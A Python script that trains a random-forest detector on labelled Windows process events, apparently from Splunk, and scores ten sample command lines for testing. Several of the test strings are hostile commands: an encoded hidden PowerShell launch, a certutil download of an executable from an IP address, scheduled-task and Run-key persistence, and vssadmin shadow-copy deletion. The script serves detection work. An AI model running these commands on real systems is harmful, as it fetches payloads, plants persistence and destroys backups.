from pathlib import Path

import joblib
import pandas as pd
from sklearn.ensemble import RandomForestClassifier

from features import build

df = pd.read_csv("data/splunk_labeled.csv", low_memory=False)
p = df[df["EventID"] == 1].reset_index(drop=True)
X, top = build(p)
y = p["is_attack"].values

m = RandomForestClassifier(n_estimators=300, class_weight="balanced_subsample",
                           random_state=1, n_jobs=-1).fit(X, y)
Path("models").mkdir(exist_ok=True)
joblib.dump({"model": m, "top_exes": top, "columns": list(X.columns)},
            "models/sentrix_rf.joblib")
print("saved models/sentrix_rf.joblib | trained on", len(p), "processes,", int(y.sum()), "attacks")

S = "c:\\windows\\system32\\"
tests = [
    ("powershell -nop -w hidden -enc jabzad0atgblahcalqbpagiaagblagmadaagae4azqb0ac4awwblagiaqwbsaguaaqblag4adaa7acqacwaua", S + "windowspowershell\\v1.0\\powershell.exe", S + "cmd.exe"),
    ("certutil -urlcache -split -f http://45.77.10.2/a.exe c:\\users\\public\\a.exe", S + "certutil.exe", S + "cmd.exe"),
    ("notepad.exe c:\\users\\bob\\notes.txt", S + "notepad.exe", "c:\\windows\\explorer.exe"),
    ("cmd.exe /c ipconfig /all", S + "cmd.exe", "c:\\windows\\explorer.exe"),
    ("schtasks /create /sc minute /mo 5 /tn updater /tr c:\\users\\public\\x.exe", S + "schtasks.exe", S + "cmd.exe"),
    ("chrome.exe --type=renderer --lang=en-us", "c:\\program files\\google\\chrome\\application\\chrome.exe", "c:\\program files\\google\\chrome\\application\\chrome.exe"),
    ("reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v x /d c:\\temp\\x.exe", S + "reg.exe", S + "cmd.exe"),
    ("rundll32.exe c:\\users\\bob\\appdata\\local\\temp\\z.dll,start", S + "rundll32.exe", "c:\\program files\\microsoft office\\winword.exe"),
    ("powershell.exe get-childitem c:\\reports", S + "windowspowershell\\v1.0\\powershell.exe", "c:\\windows\\explorer.exe"),
    ("vssadmin delete shadows /all /quiet", S + "vssadmin.exe", S + "cmd.exe"),
]
t = pd.DataFrame(tests, columns=["CommandLine", "Image", "ParentImage"])
Xt, _ = build(t, top)
prob = m.predict_proba(Xt[X.columns])[:, 1]
print()
print("TEN COMMANDS I WROTE (not from any dataset)")
for (cmd, _, _), pr in zip(tests, prob):
    print(f"  {pr:.2f}  {'ATTACK' if pr >= 0.5 else 'normal'}  {cmd[:80]}")